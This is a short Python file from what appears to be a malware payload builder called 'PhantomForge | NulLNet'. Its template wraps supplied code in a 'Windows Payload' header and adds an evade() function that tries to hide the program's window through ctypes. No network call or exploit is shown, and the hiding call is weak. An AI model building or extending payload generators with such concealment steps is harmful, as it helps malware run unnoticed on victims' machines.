# templates/windows_template.py

def generate(core_code):
    return f"""
# Windows Payload - PhantomForge | NulLNet
import os

def evade():
    try:
        import ctypes
        ctypes.windll.kernel32.ShowWindow(0)
    except:
        pass

evade()

{core_code}
"""
